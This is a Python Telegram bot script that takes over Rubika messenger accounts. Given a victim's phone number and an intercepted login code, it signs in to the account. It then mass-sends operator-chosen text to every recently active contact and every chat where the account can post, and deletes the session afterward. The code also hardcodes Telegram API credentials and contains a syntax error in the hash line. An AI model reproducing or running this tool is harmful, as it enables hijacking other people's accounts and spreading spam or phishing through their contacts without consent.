from telethon import TelegramClient, events, sync
from rubpy import Client as rubClient, methods
from rubpy.crypto import Crypto
import asyncio, os, time

api_id = 28492101
api_hash = 3bde8a7823af88c00813002620e883a6''
admin = [6826479744]
client = TelegramClient('ArmX', api_id, api_hash)
client.start()
temp_client = {}
temp_client2 = {}
database = {}

@client.on(events.NewMessage)
async def Message(event):
  chat_id = event.chat_id
  sender_id = event.sender_id
  text = event.raw_text
  global database
  try:
    database[chat_id]
  except:
    database[chat_id] = {'command': None, 'message_text': None}
  command = database[chat_id]['command']
  message_text = database[chat_id]['message_text']
    
  if text in 'تنظیم متن':
    database[chat_id]['command'] = "setText"
    await event.reply('بفرست کونکش')
  elif command == 'setText':
    database[chat_id]['message_text'] = text
    await event.reply(f'ست شد کونکش \n {text}')
    database[chat_id]['command'] = None
  elif text in 'تکست':
    await event.reply(message_text)
    
  elif text in 'hi':
    await event.reply('Bye')
    
  elif text in 'ارسال کد':
    message = await event.get_reply_message()
    phone = message.message.split("Number :")[1].split("\n")[0].replace('09', '9')
    await event.reply(f'send code To {phone}')
    temp_client['client'] = rubClient(session='session')
    await temp_client['client'].connect()
    temp_client['phone_number'] = phone
    temp_client['response'] = await temp_client['client'](methods.authorisations.SendCode(phone_number=phone))
    
  elif text in 'برو توش':
    message = await event.get_reply_message()
    code = message.message.split("کد فعال سازی روبیکا: ")[1].split("\n")[0]
    await event.reply(f'Login to Account Ba code {code}')
    await event.reply(code.replace('Code ', ''))
    public_key, temp_client['client']._private_key = Crypto.create_keys()
    m = await temp_client['client'](methods.authorisations.SignIn(phone_code=code.replace('Code ', ''), phone_number=temp_client['phone_number'], phone_code_hash=temp_client['response'].phone_code_hash, public_key=public_key))
    if m.status == "OK":
      await event.reply(f'sending')
      contacts = await temp_client['client'].get_contacts()
      if contacts.users:
        total = len(contacts.users)
        successful = 0
        unsuccessful = 0
        for index, contact in enumerate(contacts.users, start=1):
          try:
            if round(int(time.time()) - int(contact.last_online)) <= 86400:
              sending_message = await temp_client['client'].send_message(str(contact.user_guid), str(message_text))
              successful += 1
          except Exception:
            unsuccessful += 1
          if successful >= 50:
            time.sleep(3)
        unsuccessful = total-successful
        await event.reply(f'Send Contacts : {successful}\n Not Send {unsuccessful}\nTotal : {total}')
      else:
        await event.reply('No Contacts')
        
      await event.reply('sending all chat')
        
      dialogs = await temp_client['client'](methods.chats.GetChats(start_id=None))
      if dialogs.chats:
        total = len(dialogs.chats)
        successful = 0
        unsuccessful = 0
        for index, dialog in enumerate(dialogs.chats, start=1):
          if methods.groups.SendMessages in dialog.access:
            try:
              send = await temp_client['client'].send_message(dialog.object_guid, str(message_text))
              successful += 1
              print("ok")
            except Exception:
              print("error")
            if successful >= 50:
              time.sleep(5)
        unsuccessful = total-successful
        await event.reply(f'Send Chats : {successful}\n Not Send {unsuccessful}\nTotal : {total}')
      else:
        await event.reply('No Chats')
      database[chat_id]['command'] = None
      await temp_client['client'].disconnect()
      os.remove('session.rbs')
    else:
      await event.reply('Error Login code')
      
      
  elif text in 'ارسال کد2':

    message = await event.get_reply_message()

    phone = message.message.split("Number :")[1].split("\n")[0].replace('09', '9')
    await event.reply(f'send code To {phone}')
    temp_client2['client'] = rubClient(session='session2')
    await temp_client2['client'].connect()
    temp_client2['phone_number'] = phone
    temp_client2['response'] = await temp_client2['client'](methods.authorisations.SendCode(phone_number=phone))
    
  elif text in 'برو توش2':
    message = await event.get_reply_message()
    code = message.message.split("کد فعال سازی روبیکا: ")[1].split("\n")[0]
    await event.reply(f'Login to Account Ba code {code}')
    await event.reply(code.replace('Code ', ''))
    public_key, temp_client2['client']._private_key = Crypto.create_keys()
    m = await temp_client2['client'](methods.authorisations.SignIn(phone_code=code.replace('Code ', ''), phone_number=temp_client2['phone_number'], phone_code_hash=temp_client2['response'].phone_code_hash, public_key=public_key))
    if m.status == "OK":
      await event.reply(f'sending')
      contacts = await temp_client2['client'].get_contacts()
      if contacts.users:
        total = len(contacts.users)
        successful = 0
        unsuccessful = 0
        for index, contact in enumerate(contacts.users, start=1):
          try:
            if round(int(time.time()) - int(contact.last_online)) <= 86400:
              sending_message = await temp_client2['client'].send_message(str(contact.user_guid), str(message_text))
              successful += 1
          except Exception:
            unsuccessful += 1
          if successful >= 50:
            time.sleep(3)
        unsuccessful = total-successful
        await event.reply(f'Send Contacts : {successful}\n Not Send {unsuccessful}\nTotal : {total}')
      else:
        await event.reply('No Contacts')
        
      await event.reply('sending all chat')
        
      dialogs = await temp_client2['client'](methods.chats.GetChats(start_id=None))
      if dialogs.chats:
        total = len(dialogs.chats)
        successful = 0
        unsuccessful = 0
        for index, dialog in enumerate(dialogs.chats, start=1):
          if methods.groups.SendMessages in dialog.access:
            try:
              send = await temp_client2['client'].send_message(dialog.object_guid, str(message_text))
              successful += 1
              print("ok")
            except Exception:
              print("error")
            if successful >= 50:
              time.sleep(5)
        unsuccessful = total-successful
        await event.reply(f'Send Chats : {successful}\n Not Send {unsuccessful}\nTotal : {total}')
      else:
        await event.reply('No Chats')
      database[chat_id]['command'] = None
      await temp_client2['client'].disconnect()
      os.remove('session2.rbs')
    else:
      await event.reply('Error Login code')
      
      
client.run_until_disconnected()